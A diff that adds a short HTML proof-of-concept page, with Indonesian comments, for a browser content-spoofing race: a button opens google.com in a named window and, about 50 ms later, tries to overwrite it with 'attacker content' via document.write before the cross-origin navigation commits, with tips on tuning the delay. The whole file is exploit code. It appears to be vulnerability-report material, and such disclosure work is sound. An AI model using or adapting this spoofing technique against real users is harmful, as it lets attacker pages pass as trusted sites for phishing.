@@ -1,0 +1,21 @@
+<!doctype html><meta charset="utf-8">
+<button onclick="spoof()">Trigger</button>
+<script>
+function spoof(){
+  // buka window target dengan nama 'x' (akan reuse jika sudah ada)
+  const win = window.open("https://www.google.com/", "x");
+  if(!win){ alert("popup blocked"); return; }
+
+  // injeksi cepat sebelum navigasi cross-origin 'commit'
+  setTimeout(()=>{
+    try {
+      win.document.open();
+      win.document.write('<h1>This is attacker content</h1><p>PoC</p>');
+      win.document.close();
+      console.log("injected");
+    } catch(e){
+      console.warn("injection blocked:", e);
+    }
+  }, 50); // coba 20 / 50 / 100 ms tergantung target
+}
+</script>
